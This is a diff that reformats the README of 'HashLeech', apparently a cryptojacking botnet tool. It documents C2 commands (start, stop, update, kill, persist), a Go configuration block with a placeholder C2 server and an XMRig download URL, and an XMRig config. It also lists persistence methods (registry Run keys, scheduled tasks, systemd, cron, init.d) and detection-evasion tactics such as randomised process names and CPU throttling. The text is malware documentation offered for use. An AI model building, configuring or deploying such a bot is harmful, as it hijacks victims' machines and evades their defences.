@@ -62,16 +62,16 @@ Run the bot:
 Command Reference
 |------------|------------|----------------|
 ||
-|Command	Description	Example|
-|START	Start mining operation	START|
-|STOP	Stop mining operation	STOP|
-|UPDATE	Update miner binary	UPDATE|
-|KILL	Remove miner and bot	KILL|
-|PERSIST	Install persistence mechanism	PERSIST|
-|Configuration
-|Edit the following constants in bot.go before building:|
+|Command	|Description	|Example|
+|START	|Start mining operation	|START|
+|STOP	|Stop mining operation	|STOP|
+|UPDATE	|Update miner binary	|UPDATE|
+|KILL	|Remove miner and bot	|KILL|
+|PERSIST|	Install| persistence |mechanism	|PERSIST|
 
-go
+Configuration
+Edit the following constants in bot.go before building:
+```go
 const (
     C2Address         = "your.c2.server.com:7003"  // Your C2 server address
     xmrigURL          = "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-msvc-win64.zip"
@@ -79,10 +79,11 @@ const (
     minerPath         = "C:\\Windows\\Temp\\xmrig.exe"           // Windows path
     // minerPath      = "/tmp/xmrig"                            // Linux path
 )
+```
 Mining Configuration
 The config.json file should contain standard XMRig configuration. Example:
 
-json
+```json
 {
     "autosave": true,
     "cpu": true,
@@ -98,30 +99,27 @@ json
         }
     ]
 }
+```
 Persistence Mechanisms
 HashLeech implements multiple persistence methods:
 
 Windows:
-
 Registry Run key
-
 Scheduled tasks
 
 Linux:
-
 Systemd service
-
 Cron job
-
 Init.d script
 
+Both:
+```Text
 Detection Avoidance
 Randomizes process names
 
 Uses standard TLS for C2 communication
-
 Limits CPU usage to avoid detection
 
 Runs with low process priority
-
 Hides in system temp directories
+```
